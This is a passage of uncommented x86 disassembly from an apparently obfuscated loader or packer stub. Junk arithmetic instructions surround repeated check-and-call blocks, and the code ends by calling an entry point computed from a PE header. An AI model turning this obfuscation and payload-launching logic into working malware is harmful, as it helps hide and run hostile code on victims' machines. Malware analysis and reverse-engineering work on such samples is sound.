  422d60:	call   DWORD PTR ds:0x42b31e
  422d66:	cmp    DWORD PTR ds:0x42b20e,0x13
  422d6d:	jb     0x422d2d
  422d73:	mov    DWORD PTR [esp+0x18],ecx
  422d77:	mov    ebx,DWORD PTR ds:0x42b28e
  422d7d:	mov    edx,DWORD PTR ds:0x42b2be
  422d83:	sub    edx,ebx
  422d85:	add    ebx,DWORD PTR [ebx+edx*1]
  422d88:	mov    DWORD PTR [esp+0xc],0xf89c85a2
  422d90:	mov    ebx,DWORD PTR ds:0x42b26a
  422d96:	xor    edx,edx
  422d98:	or     edx,DWORD PTR ds:0x42b2aa
  422d9e:	sub    ebx,edx
  422da0:	and    ebx,DWORD PTR [ebx+edx*1]
  422da3:	lea    eax,[esp+0x3c]
  422da7:	or     edi,0x6d65
  422dad:	mov    DWORD PTR [esp+0x30],eax
  422db1:	adc    DWORD PTR ds:0x42b212,0x17e9
  422dbb:	lea    eax,[esp+0x38]
  422dbf:	and    DWORD PTR ds:0x42b20a,0x0
  422dc9:	mov    edx,DWORD PTR ds:0x42b20a
  422dcf:	inc    edx
  422dd0:	mov    DWORD PTR ds:0x42b20a,edx
  422dd6:	cmp    DWORD PTR ds:0x42b20a,0xc
  422ddd:	jle    0x422e18
  422de3:	jmp    0x422df1
  422de8:	push   DWORD PTR [ebp-0x14]
  422deb:	call   DWORD PTR ds:0x42b322
  422df1:	cmp    DWORD PTR ds:0x42b20a,0xb
  422df8:	jne    0x422e0b
  422dfe:	mov    edx,DWORD PTR ds:0x42b20a
  422e04:	inc    edx
  422e05:	mov    DWORD PTR ds:0x42b20a,edx
  422e0b:	cmp    DWORD PTR ds:0x42b20a,0x12
  422e12:	jb     0x422dc9
  422e18:	mov    DWORD PTR [esp+0x20],eax
  422e1c:	xor    edx,edx
  422e1e:	add    edx,DWORD PTR ds:0x42b292
  422e24:	mov    eax,ds:0x42b29a
  422e29:	sub    eax,edx
  422e2b:	add    edx,DWORD PTR [edx+eax*1]
  422e2e:	mov    eax,ds:0x42a472
  422e33:	mov    eax,DWORD PTR [eax+0x1c8]
  422e39:	mov    eax,DWORD PTR [eax]
  422e3b:	adc    edi,0x4659
  422e41:	mov    edx,DWORD PTR [esp+0x20]
  422e45:	xor    ebx,ebx
  422e47:	mov    edi,0x75108ae
  422e4c:	adc    ebx,DWORD PTR ds:0x42b226
  422e52:	xor    eax,edi
  422e54:	mov    ebx,DWORD PTR ds:0x42b1d2
  422e5a:	sbb    ebx,DWORD PTR ds:0x42b1ca
  422e60:	mov    DWORD PTR ds:0x42b1d2,ebx
  422e66:	mov    ebx,0x3272f5
  422e6b:	add    eax,ebx
  422e6d:	mov    DWORD PTR ds:0x42b182,0x4af1
  422e77:	mov    DWORD PTR [edx],eax
  422e79:	mov    eax,ds:0x42b042
  422e7e:	cmp    eax,0x455dedfa
  422e83:	jne    0x422fd8
  422e89:	and    DWORD PTR ds:0x42b1c6,0x0
  422e93:	mov    eax,ds:0x42b1c6
  422e98:	inc    eax
  422e99:	mov    ds:0x42b1c6,eax
  422e9e:	cmp    DWORD PTR ds:0x42b1c6,0x9
  422ea5:	ja     0x422ede
  422eab:	jmp    0x422eb9
  422eb0:	push   DWORD PTR [ebp-0x18]
  422eb3:	call   DWORD PTR ds:0x42b326
  422eb9:	cmp    DWORD PTR ds:0x42b1c6,0x8
  422ec0:	jne    0x422ed1
  422ec6:	mov    eax,ds:0x42b1c6
  422ecb:	inc    eax
  422ecc:	mov    ds:0x42b1c6,eax
  422ed1:	cmp    DWORD PTR ds:0x42b1c6,0x17
  422ed8:	jb     0x422e93
  422ede:	mov    eax,DWORD PTR [esp+0x18]
  422ee2:	and    DWORD PTR ds:0x42b1ca,0x0
  422eec:	jmp    0x422f00
  422ef1:	xor    edx,edx
  422ef3:	add    edx,DWORD PTR ds:0x42b1ca
  422ef9:	inc    edx
  422efa:	mov    DWORD PTR ds:0x42b1ca,edx
  422f00:	cmp    DWORD PTR ds:0x42b1ca,0x11
  422f07:	jae    0x422f60
  422f0d:	cmp    DWORD PTR ds:0x42b1ca,0x7
  422f14:	ja     0x422f60
  422f1a:	jmp    0x422f41
  422f1f:	push   0x42a04a
  422f24:	push   DWORD PTR [ebp-0x18]
  422f27:	push   0x268e
  422f2c:	push   0x3495
  422f31:	push   0x4b1a
  422f36:	push   0x4d1d
  422f3b:	call   DWORD PTR ds:0x42b2ea
  422f41:	cmp    DWORD PTR ds:0x42b1ca,0x6
  422f48:	jne    0x422f5b
  422f4e:	mov    edx,DWORD PTR ds:0x42b1ca
  422f54:	inc    edx
  422f55:	mov    DWORD PTR ds:0x42b1ca,edx
  422f5b:	jmp    0x422ef1
  422f60:	mov    edx,DWORD PTR ds:0x42a472
  422f66:	add    DWORD PTR ds:0x42b20e,0x42b1fe
  422f70:	mov    edx,DWORD PTR [edx+0x198]
  422f76:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  422f80:	xor    eax,edi
  422f82:	add    eax,ebx
  422f84:	sub    DWORD PTR ds:0x42b202,0x7175
  422f8e:	mov    DWORD PTR [edx],eax
  422f90:	sbb    DWORD PTR ds:0x42b1da,edi
  422f96:	mov    eax,DWORD PTR [esp+0x18]
  422f9a:	xor    eax,edi
  422f9c:	add    DWORD PTR ds:0x42b1f2,0x42b22a
  422fa6:	add    eax,ebx
  422fa8:	or     DWORD PTR ds:0x42b1c6,0x2272
  422fb2:	mov    ds:0x42b042,eax
  422fb7:	mov    eax,DWORD PTR [esp+0x18]
  422fbb:	xor    eax,edi
  422fbd:	adc    DWORD PTR ds:0x42b192,0x42b18e
  422fc7:	add    eax,ebx
  422fc9:	sbb    DWORD PTR ds:0x42b212,0x42b1b6
  422fd3:	mov    ds:0x42a56a,eax
  422fd8:	sub    DWORD PTR ds:0x42b1a6,edi
  422fde:	mov    eax,ds:0x42a472
  422fe3:	adc    DWORD PTR ds:0x42b1b2,0x42b206
  422fed:	mov    eax,DWORD PTR [eax+0x18c]
  422ff3:	adc    DWORD PTR ds:0x42b1ee,0x42b1da
  422ffd:	mov    eax,DWORD PTR [eax]
  422fff:	or     DWORD PTR ds:0x42b20e,0x42b1c6
  423009:	mov    DWORD PTR [esp+0x60],eax
  42300d:	not    eax
  42300f:	mov    eax,0xf89c85a1
  423014:	sbb    DWORD PTR ds:0x42b1d2,0xc9c
  42301e:	mov    DWORD PTR [esp+0x10],eax
  423022:	mov    DWORD PTR [esp+0x10],eax
  423026:	sbb    DWORD PTR ds:0x42b222,0x42b21e
  423030:	mov    DWORD PTR [esp+0x10],eax
  423034:	mov    DWORD PTR [esp+0x10],ecx
  423038:	sub    DWORD PTR ds:0x42b22a,0x42b1ce
  423042:	mov    DWORD PTR [esp+0x20],eax
  423046:	mov    DWORD PTR [esp+0x20],0xf89c85bd
  42304e:	and    DWORD PTR ds:0x42b1aa,0x45c4
  423058:	mov    eax,DWORD PTR [esp+0x18]
  42305c:	add    DWORD PTR ds:0x42b1c2,0x42b18a
  423066:	xor    eax,edi
  423068:	add    eax,ebx
  42306a:	jmp    0x4231b3
  42306f:	or     DWORD PTR ds:0x42b21a,0x42b18e
  423079:	lea    eax,[esp+0x1b8]
  423080:	push   eax
  423081:	push   0x42a646
  423086:	call   DWORD PTR ds:0x42b312
  42308c:	mov    DWORD PTR ds:0x42b1e2,0x6a7b
  423096:	cmp    eax,0xffffffff
  423099:	mov    DWORD PTR ds:0x42b1be,0xa85
  4230a3:	jne    0x422c5a
  4230a9:	xor    DWORD PTR ds:0x42b1ee,0x42b19a
  4230b3:	push   0xf
  4230b5:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  4230bf:	lea    eax,[esp+0x44]
  4230c3:	push   eax
  4230c4:	push   0x42a67a
  4230c9:	push   0x42a68e
  4230ce:	add    DWORD PTR ds:0x42b1ce,0x42b22a
  4230d8:	push   0x42a6b2
  4230dd:	dec    DWORD PTR ds:0x42b1f2
  4230e3:	call   esi
  4230e5:	imul   eax,eax,0x300000
  4230eb:	cmp    eax,0x1b00000
  4230f0:	jne    0x422c5a
  4230f6:	sbb    DWORD PTR ds:0x42b1be,0x817
  423100:	lea    eax,[esp+0x78]
  423104:	push   eax
  423105:	or     DWORD PTR ds:0x42b18e,0x42b1e2
  42310f:	push   0xffffffff
  423111:	add    DWORD PTR ds:0x42b1d6,0x42b18a
  42311b:	call   DWORD PTR ds:0x42b30a
  423121:	xor    DWORD PTR ds:0x42b1fe,0x42b19e
  42312b:	test   eax,eax
  42312d:	mov    DWORD PTR ds:0x42b20e,0x786b
  423137:	jne    0x422c5a
  42313d:	mov    eax,DWORD PTR [esp+0xc]
  423141:	mov    ecx,DWORD PTR [esp+0x20]
  423145:	or     DWORD PTR ds:0x42b1fa,0x5b03
  42314f:	xor    eax,edi
  423151:	and    DWORD PTR ds:0x42b182,0x42b1da
  42315b:	lea    eax,[eax+ecx*1+0x3272f5]
  423162:	push   eax
  423163:	sub    DWORD PTR ds:0x42b1fe,ecx
  423169:	mov    eax,DWORD PTR [esp+0x14]
  42316d:	xor    eax,edi
  42316f:	lea    eax,[ebp+eax*1+0x3272fd]
  423176:	add    DWORD PTR ds:0x42b212,0x505
  423180:	push   eax
  423181:	adc    eax,0xe25
  423186:	mov    eax,ds:0x42a472
  42318b:	push   DWORD PTR [eax+0x1bc]
  423191:	and    DWORD PTR ds:0x42b186,0x42b1b6
  42319b:	call   0x423df0
  4231a0:	mov    eax,DWORD PTR [esp+0xc]
  4231a4:	neg    edx
  4231a6:	mov    ecx,DWORD PTR [esp+0x20]
  4231aa:	xor    eax,edi
  4231ac:	lea    eax,[ecx+eax*1+0x3272f5]
  4231b3:	adc    ecx,DWORD PTR ds:0x42b1fa
  4231b9:	mov    ecx,DWORD PTR [esp+0xc]
  4231bd:	add    DWORD PTR ds:0x42b1ce,edi
  4231c3:	mov    edx,DWORD PTR [esp+0xc]
  4231c7:	and    DWORD PTR ds:0x42b1aa,0x42b186
  4231d1:	xor    edx,edi
  4231d3:	xor    ecx,edi
  4231d5:	not    DWORD PTR ds:0x42b1e6
  4231db:	add    ecx,edx
  4231dd:	mov    edx,DWORD PTR ds:0x42b20a
  4231e3:	and    DWORD PTR ds:0x42b222,edx
  4231e9:	mov    edx,DWORD PTR [esp+0xc]
  4231ed:	xor    edx,edi
  4231ef:	mov    DWORD PTR ds:0x42b182,0x14ab
  4231f9:	lea    ecx,[ecx+edx*1+0x9758df]
  423200:	mov    DWORD PTR ds:0x42b1e2,0x2305
  42320a:	mov    DWORD PTR [esp+0x20],eax
  42320e:	cmp    eax,ecx
  423210:	jbe    0x42306f
  423216:	xor    eax,ecx
  423218:	mov    eax,DWORD PTR [ebp+0xc]
  42321b:	adc    DWORD PTR ds:0x42b186,edi
  423221:	mov    ds:0x42a2f6,eax
  423226:	mov    ecx,DWORD PTR ds:0x42b1fe
  42322c:	adc    DWORD PTR ds:0x42b1f2,ecx
  423232:	mov    eax,DWORD PTR [ebp+0x10]
  423235:	inc    ecx
  423236:	mov    ds:0x42a552,eax
  42323b:	mov    eax,ds:0x42a2f6
  423240:	and    DWORD PTR ds:0x42b1b6,ebx
  423246:	mov    ecx,DWORD PTR [esp+0x30]
  42324a:	sub    eax,ebx
  42324c:	sbb    DWORD PTR ds:0x42b1be,0x1289
  423256:	xor    eax,edi
  423258:	xor    DWORD PTR ds:0x42b216,0x69d8
  423262:	mov    DWORD PTR [ecx],eax
  423264:	sub    DWORD PTR ds:0x42b1fe,0x6484
  42326e:	lea    eax,[esp+0x2c]
  423272:	mov    DWORD PTR [esp+0x6c],eax
  423276:	lea    eax,[ebp+0x4]
  423279:	sbb    DWORD PTR ds:0x42b1ba,0x4eab
  423283:	mov    DWORD PTR [esp+0x2c],eax
  423287:	lea    eax,[esp+0x1b8]
  42328e:	push   eax
  42328f:	xor    DWORD PTR ds:0x42b1b2,0x3d91
  423299:	push   0x42a6e2
  42329e:	mov    DWORD PTR ds:0x42b20e,0x4af0
  4232a8:	call   DWORD PTR ds:0x42b312
  4232ae:	cmp    eax,0xffffffff
  4232b1:	jne    0x422c5a
  4232b7:	push   0xf
  4232b9:	lea    eax,[esp+0x44]
  4232bd:	sub    DWORD PTR ds:0x42b20e,0x42b18a
  4232c7:	push   eax
  4232c8:	or     DWORD PTR ds:0x42b1ba,0x144a
  4232d2:	push   0x42a716
  4232d7:	push   0x42a72a
  4232dc:	sbb    DWORD PTR ds:0x42b1ba,0x42b182
  4232e6:	push   0x42a74e
  4232eb:	xor    DWORD PTR ds:0x42b19e,0x42b1fe
  4232f5:	call   esi
  4232f7:	imul   eax,eax,0x300000
  4232fd:	mov    DWORD PTR ds:0x42b1fa,0x26c3
  423307:	cmp    eax,0x1b00000
  42330c:	mov    DWORD PTR ds:0x42b19a,0x6081
  423316:	jne    0x422c5a
  42331c:	lea    eax,[esp+0x78]
  423320:	push   eax
  423321:	push   0xffffffff
  423323:	and    DWORD PTR ds:0x42b1e6,0x42b1aa
  42332d:	call   DWORD PTR ds:0x42b30a
  423333:	sbb    DWORD PTR ds:0x42b19a,0x42b1f6
  42333d:	test   eax,eax
  42333f:	mov    DWORD PTR ds:0x42b1a2,0x6ec1
  423349:	jne    0x422c5a
  42334f:	sub    DWORD PTR ds:0x42b1b2,0x1fda
  423359:	lea    eax,[esp+0x1b8]
  423360:	sbb    DWORD PTR ds:0x42b1fe,0x42b1ee
  42336a:	push   eax
  42336b:	push   0x42a77e
  423370:	adc    DWORD PTR ds:0x42b1f2,0x42b1c6
  42337a:	call   DWORD PTR ds:0x42b312
  423380:	mov    DWORD PTR ds:0x42b19e,0x2ae7
  42338a:	cmp    eax,0xffffffff
  42338d:	jne    0x422c5a
  423393:	adc    DWORD PTR ds:0x42b206,0x701e
  42339d:	push   0xf
  42339f:	lea    eax,[esp+0x44]
  4233a3:	or     DWORD PTR ds:0x42b18e,0x5b00
  4233ad:	push   eax
  4233ae:	push   0x42a7b2
  4233b3:	dec    DWORD PTR ds:0x42b1ba
  4233b9:	push   0x42a7c6
  4233be:	push   0x42a7ea
  4233c3:	sub    DWORD PTR ds:0x42b1e6,0x42b20e
  4233cd:	call   esi
  4233cf:	imul   eax,eax,0x300000
  4233d5:	mov    DWORD PTR ds:0x42b1be,0x6087
  4233df:	cmp    eax,0x1b00000
  4233e4:	mov    DWORD PTR ds:0x42b1d6,0x2e79
  4233ee:	jne    0x422c5a
  4233f4:	lea    eax,[esp+0x78]
  4233f8:	and    DWORD PTR ds:0x42b21e,0x6601
  423402:	push   eax
  423403:	add    DWORD PTR ds:0x42b206,0x4958
  42340d:	push   0xffffffff
  42340f:	and    DWORD PTR ds:0x42b1fa,0x42b1aa
  423419:	call   DWORD PTR ds:0x42b30a
  42341f:	mov    DWORD PTR ds:0x42b222,0x2f7c
  423429:	test   eax,eax
  42342b:	jne    0x422c5a
  423431:	and    DWORD PTR ds:0x42b1e2,0x6b99
  42343b:	lea    eax,[esp+0x1b8]
  423442:	push   eax
  423443:	add    DWORD PTR ds:0x42b22a,0x61ec
  42344d:	push   0x42a81a
  423452:	call   DWORD PTR ds:0x42b312
  423458:	mov    DWORD PTR ds:0x42b1c6,0x2abd
  423462:	cmp    eax,0xffffffff
  423465:	jne    0x422c5a
  42346b:	sbb    DWORD PTR ds:0x42b202,0x42b212
  423475:	push   0xf
  423477:	sub    DWORD PTR ds:0x42b192,0x503c
  423481:	lea    eax,[esp+0x44]
  423485:	push   eax
  423486:	push   0x42a84e
  42348b:	push   0x42a862
  423490:	push   0x42a886
  423495:	call   esi
  423497:	and    DWORD PTR ds:0x42b1c6,0x7bbe
  4234a1:	imul   eax,eax,0x300000
  4234a7:	cmp    eax,0x1b00000
  4234ac:	mov    DWORD PTR ds:0x42b1fe,0x19ae
  4234b6:	jne    0x422c5a
  4234bc:	lea    eax,[esp+0x78]
  4234c0:	push   eax
  4234c1:	neg    DWORD PTR ds:0x42b19e
  4234c7:	push   0xffffffff
  4234c9:	call   DWORD PTR ds:0x42b30a
  4234cf:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  4234d9:	test   eax,eax
  4234db:	mov    DWORD PTR ds:0x42b196,0x192f
  4234e5:	jne    0x422c5a
  4234eb:	or     DWORD PTR ds:0x42b186,0x42b22e
  4234f5:	lea    eax,[esp+0x1b8]
  4234fc:	push   eax
  4234fd:	push   0x42a8b6
  423502:	sbb    DWORD PTR ds:0x42b216,0x426f
  42350c:	call   DWORD PTR ds:0x42b312
  423512:	cmp    eax,0xffffffff
  423515:	mov    DWORD PTR ds:0x42b18e,0x3e1f
  42351f:	jne    0x422c5a
  423525:	push   0xf
  423527:	or     DWORD PTR ds:0x42b182,0x42b1da
  423531:	lea    eax,[esp+0x44]
  423535:	push   eax
  423536:	push   0x42a8ea
  42353b:	xor    DWORD PTR ds:0x42b226,0x42b20a
  423545:	push   0x42a8fe
  42354a:	sub    DWORD PTR ds:0x42b226,0x42b22a
  423554:	push   0x42a922
  423559:	add    DWORD PTR ds:0x42b216,0x42b1d6
  423563:	call   esi
  423565:	add    DWORD PTR ds:0x42b1f6,0x38e
  42356f:	imul   eax,eax,0x300000
  423575:	mov    DWORD PTR ds:0x42b19a,0x2257
  42357f:	cmp    eax,0x1b00000
  423584:	mov    DWORD PTR ds:0x42b21a,0x2a1a
  42358e:	jne    0x422c5a
  423594:	adc    DWORD PTR ds:0x42b206,0x42b1a6
  42359e:	lea    eax,[esp+0x78]
  4235a2:	or     DWORD PTR ds:0x42b22e,0x42b1ca
  4235ac:	push   eax
  4235ad:	push   0xffffffff
  4235af:	call   DWORD PTR ds:0x42b30a
  4235b5:	and    DWORD PTR ds:0x42b182,0x42b1a6
  4235bf:	test   eax,eax
  4235c1:	mov    DWORD PTR ds:0x42b1aa,0x4002
  4235cb:	jne    0x422c5a
  4235d1:	dec    DWORD PTR ds:0x42b212
  4235d7:	lea    eax,[esp+0x1b8]
  4235de:	dec    DWORD PTR ds:0x42b18e
  4235e4:	push   eax
  4235e5:	or     DWORD PTR ds:0x42b1ea,0x42b212
  4235ef:	push   0x42a952
  4235f4:	add    DWORD PTR ds:0x42b202,0x42b216
  4235fe:	call   DWORD PTR ds:0x42b312
  423604:	cmp    eax,0xffffffff
  423607:	mov    DWORD PTR ds:0x42b212,0x6bd3
  423611:	jne    0x422c5a
  423617:	push   0xf
  423619:	add    DWORD PTR ds:0x42b1da,0x37be
  423623:	lea    eax,[esp+0x44]
  423627:	xor    DWORD PTR ds:0x42b216,0x42b21e
  423631:	push   eax
  423632:	push   0x42a986
  423637:	sub    DWORD PTR ds:0x42b1be,0x5164
  423641:	push   0x42a99a
  423646:	push   0x42a9be
  42364b:	or     DWORD PTR ds:0x42b182,0x42b21e
  423655:	call   esi
  423657:	and    DWORD PTR ds:0x42b20e,0x1f3e
  423661:	imul   eax,eax,0x300000
  423667:	mov    DWORD PTR ds:0x42b1ee,0x7e45
  423671:	cmp    eax,0x1b00000
  423676:	jne    0x422c5a
  42367c:	add    DWORD PTR ds:0x42b182,0x42b1b2
  423686:	lea    eax,[esp+0x78]
  42368a:	sub    DWORD PTR ds:0x42b1c6,0x42b1a6
  423694:	push   eax
  423695:	sbb    DWORD PTR ds:0x42b1b2,0x42b18a
  42369f:	push   0xffffffff
  4236a1:	adc    DWORD PTR ds:0x42b212,0x32d0
  4236ab:	call   DWORD PTR ds:0x42b30a
  4236b1:	or     DWORD PTR ds:0x42b1f2,0x42b1fe
  4236bb:	test   eax,eax
  4236bd:	jne    0x422c5a
  4236c3:	and    DWORD PTR ds:0x42b186,0x42b1fa
  4236cd:	lea    eax,[esp+0x1b8]
  4236d4:	xor    DWORD PTR ds:0x42b202,0x42b1fa
  4236de:	push   eax
  4236df:	push   0x42a9ee
  4236e4:	call   DWORD PTR ds:0x42b312
  4236ea:	mov    DWORD PTR ds:0x42b1ea,0x2426
  4236f4:	cmp    eax,0xffffffff
  4236f7:	mov    DWORD PTR ds:0x42b20a,0x3daf
  423701:	jne    0x422c5a
  423707:	sub    DWORD PTR ds:0x42b1e6,0x42b22a
  423711:	push   0xf
  423713:	adc    DWORD PTR ds:0x42b1ee,0x42b20a
  42371d:	lea    eax,[esp+0x44]
  423721:	and    DWORD PTR ds:0x42b20a,0x3b25
  42372b:	push   eax
  42372c:	push   0x42aa22
  423731:	sub    DWORD PTR ds:0x42b1fe,0x42b21e
  42373b:	push   0x42aa36
  423740:	mov    DWORD PTR ds:0x42b1fa,0x4cb4
  42374a:	push   0x42aa5a
  42374f:	call   esi
  423751:	inc    DWORD PTR ds:0x42b1a2
  423757:	imul   eax,eax,0x300000
  42375d:	cmp    eax,0x1b00000
  423762:	mov    DWORD PTR ds:0x42b1ea,0x7ee6
  42376c:	jne    0x422c5a
  423772:	or     DWORD PTR ds:0x42b1ea,0x7d0f
  42377c:	lea    eax,[esp+0x78]
  423780:	mov    DWORD PTR ds:0x42b1aa,0x7d0c
  42378a:	push   eax
  42378b:	adc    DWORD PTR ds:0x42b1aa,0x4970
  423795:	push   0xffffffff
  423797:	and    DWORD PTR ds:0x42b212,0x37c9
  4237a1:	call   DWORD PTR ds:0x42b30a
  4237a7:	sbb    DWORD PTR ds:0x42b21e,0x7cde
  4237b1:	test   eax,eax
  4237b3:	mov    DWORD PTR ds:0x42b206,0x64c2
  4237bd:	jne    0x422c5a
  4237c3:	sub    DWORD PTR ds:0x42b1c6,0x42b182
  4237cd:	lea    eax,[esp+0x1b8]
  4237d4:	add    DWORD PTR ds:0x42b19e,0x42b1ee
  4237de:	push   eax
  4237df:	and    DWORD PTR ds:0x42b212,0x42b1de
  4237e9:	push   0x42aa8a
  4237ee:	sbb    DWORD PTR ds:0x42b20e,0x42b1fe
  4237f8:	call   DWORD PTR ds:0x42b312
  4237fe:	mov    DWORD PTR ds:0x42b222,0x5e52
  423808:	cmp    eax,0xffffffff
  42380b:	mov    DWORD PTR ds:0x42b19a,0x4e9b
  423815:	jne    0x422c5a
  42381b:	or     DWORD PTR ds:0x42b1a6,0x4b96
  423825:	push   0xf
  423827:	lea    eax,[esp+0x44]
  42382b:	or     DWORD PTR ds:0x42b22e,0x42b192
  423835:	push   eax
  423836:	push   0x42aabe
  42383b:	push   0x42aad2
  423840:	push   0x42aaf6
  423845:	add    DWORD PTR ds:0x42b216,0x42b1ee
  42384f:	call   esi
  423851:	xor    DWORD PTR ds:0x42b1e2,0x982
  42385b:	imul   eax,eax,0x300000
  423861:	mov    DWORD PTR ds:0x42b1aa,0x5061
  42386b:	cmp    eax,0x1b00000
  423870:	jne    0x422c5a
  423876:	lea    eax,[esp+0x78]
  42387a:	xor    DWORD PTR ds:0x42b1fa,0x42b1ee
  423884:	push   eax
  423885:	push   0xffffffff
  423887:	call   DWORD PTR ds:0x42b30a
  42388d:	test   eax,eax
  42388f:	jne    0x422c5a
  423895:	add    DWORD PTR ds:0x42b21e,0x42b1ce
  42389f:	lea    eax,[esp+0x1b8]
  4238a6:	push   eax
  4238a7:	adc    DWORD PTR ds:0x42b1fe,0x6ad9
  4238b1:	push   0x42ab26
  4238b6:	or     DWORD PTR ds:0x42b1d6,0x42b1be
  4238c0:	call   DWORD PTR ds:0x42b312
  4238c6:	mov    DWORD PTR ds:0x42b216,0x33dc
  4238d0:	cmp    eax,0xffffffff
  4238d3:	mov    DWORD PTR ds:0x42b182,0x32d8
  4238dd:	jne    0x422c5a
  4238e3:	add    DWORD PTR ds:0x42b1b6,0x3dc0
  4238ed:	push   0xf
  4238ef:	lea    eax,[esp+0x44]
  4238f3:	xor    DWORD PTR ds:0x42b19a,0x42b1ce
  4238fd:	push   eax
  4238fe:	push   0x42ab5a
  423903:	add    DWORD PTR ds:0x42b1e6,0x62a8
  42390d:	push   0x42ab6e
  423912:	push   0x42ab92
  423917:	xor    DWORD PTR ds:0x42b19e,0x23c8
  423921:	call   esi
  423923:	xor    DWORD PTR ds:0x42b226,0x14f0
  42392d:	imul   eax,eax,0x300000
  423933:	mov    DWORD PTR ds:0x42b1ea,0x193b
  42393d:	cmp    eax,0x1b00000
  423942:	mov    DWORD PTR ds:0x42b1ee,0x7050
  42394c:	jne    0x422c5a
  423952:	or     DWORD PTR ds:0x42b1ce,0x3f0
  42395c:	lea    eax,[esp+0x78]
  423960:	push   eax
  423961:	push   0xffffffff
  423963:	call   DWORD PTR ds:0x42b30a
  423969:	test   eax,eax
  42396b:	jne    0x422c5a
  423971:	lea    eax,[esp+0x1b8]
  423978:	push   eax
  423979:	push   0x42abc2
  42397e:	call   DWORD PTR ds:0x42b312
  423984:	cmp    eax,0xffffffff
  423987:	jne    0x422c5a
  42398d:	push   0xf
  42398f:	lea    eax,[esp+0x44]
  423993:	push   eax
  423994:	push   0x42abf6
  423999:	push   0x42ac0a
  42399e:	push   0x42ac2e
  4239a3:	call   esi
  4239a5:	imul   eax,eax,0x300000
  4239ab:	cmp    eax,0x1b00000
  4239b0:	jne    0x422c5a
  4239b6:	lea    eax,[esp+0x78]
  4239ba:	push   eax
  4239bb:	push   0xffffffff
  4239bd:	call   DWORD PTR ds:0x42b30a
  4239c3:	test   eax,eax
  4239c5:	jne    0x422c5a
  4239cb:	lea    eax,[esp+0x1b8]
  4239d2:	push   eax
  4239d3:	push   0x42ac5e
  4239d8:	call   DWORD PTR ds:0x42b312
  4239de:	cmp    eax,0xffffffff
  4239e1:	jne    0x422c5a
  4239e7:	push   0xf
  4239e9:	lea    eax,[esp+0x44]
  4239ed:	push   eax
  4239ee:	push   0x42ac92
  4239f3:	push   0x42aca6
  4239f8:	push   0x42acca
  4239fd:	call   esi
  4239ff:	imul   eax,eax,0x300000
  423a05:	cmp    eax,0x1b00000
  423a0a:	jne    0x422c5a
  423a10:	lea    eax,[esp+0x78]
  423a14:	push   eax
  423a15:	push   0xffffffff
  423a17:	call   DWORD PTR ds:0x42b30a
  423a1d:	test   eax,eax
  423a1f:	jne    0x422c5a
  423a25:	lea    eax,[esp+0x1b8]
  423a2c:	push   eax
  423a2d:	push   0x42acfa
  423a32:	call   DWORD PTR ds:0x42b312
  423a38:	cmp    eax,0xffffffff
  423a3b:	jne    0x422c5a
  423a41:	push   0xf
  423a43:	lea    eax,[esp+0x44]
  423a47:	push   eax
  423a48:	push   0x42ad2e
  423a4d:	push   0x42ad42
  423a52:	push   0x42ad66
  423a57:	call   esi
  423a59:	imul   eax,eax,0x300000
  423a5f:	cmp    eax,0x1b00000
  423a64:	jne    0x422c5a
  423a6a:	lea    eax,[esp+0x78]
  423a6e:	push   eax
  423a6f:	push   0xffffffff
  423a71:	call   DWORD PTR ds:0x42b30a
  423a77:	test   eax,eax
  423a79:	jne    0x422c5a
  423a7f:	lea    eax,[esp+0x1b8]
  423a86:	push   eax
  423a87:	push   0x42ad96
  423a8c:	call   DWORD PTR ds:0x42b312
  423a92:	cmp    eax,0xffffffff
  423a95:	jne    0x422c5a
  423a9b:	push   0xf
  423a9d:	lea    eax,[esp+0x44]
  423aa1:	push   eax
  423aa2:	push   0x42adca
  423aa7:	push   0x42adde
  423aac:	push   0x42ae02
  423ab1:	call   esi
  423ab3:	imul   eax,eax,0x300000
  423ab9:	cmp    eax,0x1b00000
  423abe:	jne    0x422c5a
  423ac4:	lea    eax,[esp+0x78]
  423ac8:	push   eax
  423ac9:	push   0xffffffff
  423acb:	call   DWORD PTR ds:0x42b30a
  423ad1:	test   eax,eax
  423ad3:	jne    0x422c5a
  423ad9:	mov    eax,DWORD PTR [esp+0x3c]
  423add:	cmp    eax,0xf89c85a2
  423ae2:	je     0x423b41
  423ae8:	mov    eax,DWORD PTR [esp+0x18]
  423aec:	mov    ecx,DWORD PTR [esp+0x38]
  423af0:	xor    eax,edi
  423af2:	add    eax,ebx
  423af4:	cmp    eax,ecx
  423af6:	je     0x423b41
  423afc:	mov    eax,ds:0x42a472
  423b01:	mov    eax,DWORD PTR [eax+0x194]
  423b07:	mov    ecx,DWORD PTR [eax]
  423b09:	mov    eax,DWORD PTR [ecx+0x3c]
  423b0c:	push   DWORD PTR ds:0x42a552
  423b12:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  423b16:	push   DWORD PTR ds:0x42a2f6
  423b1c:	add    eax,ecx
  423b1e:	mov    ecx,DWORD PTR ds:0x42a472
  423b24:	mov    ecx,DWORD PTR [ecx+0x194]
  423b2a:	push   DWORD PTR [ecx]
  423b2c:	call   eax
  423b2e:	mov    ecx,DWORD PTR ds:0x42a472
  423b34:	mov    ecx,DWORD PTR [ecx+0x1cc]
  423b3a:	mov    DWORD PTR [ecx],eax
  423b3c:	jmp    0x423d6c
  423b41:	mov    eax,DWORD PTR [esp+0x18]
  423b45:	mov    ecx,DWORD PTR [esp+0x60]
  423b49:	xor    eax,edi
  423b4b:	add    eax,ebx
  423b4d:	cmp    eax,ecx
  423b4f:	jne    0x423bba
  423b55:	mov    eax,DWORD PTR [esp+0x18]
  423b59:	mov    ecx,DWORD PTR ds:0x42a472
  423b5f:	mov    ecx,DWORD PTR [ecx+0x198]
  423b65:	xor    eax,edi
  423b67:	add    eax,ebx
  423b69:	cmp    eax,DWORD PTR [ecx]
  423b6b:	jne    0x423b93
  423b71:	mov    eax,DWORD PTR [esp+0x18]
  423b75:	push   0xffffffff
  423b77:	push   0x70941f95
  423b7c:	xor    eax,edi
  423b7e:	add    eax,ebx
  423b80:	push   eax
  423b81:	push   0xf89c85a1
  423b86:	push   DWORD PTR [esp+0x1c]
  423b8a:	push   DWORD PTR [esp+0x2c]
  423b8e:	call   0x4224d2
  423b93:	push   DWORD PTR [esp+0xc]
  423b97:	push   DWORD PTR [esp+0x1c]
  423b9b:	call   0x401000
  423ba0:	mov    eax,DWORD PTR [esp+0x18]
  423ba4:	xor    eax,edi
  423ba6:	add    eax,ebx
  423ba8:	mov    ds:0x42a4fe,eax
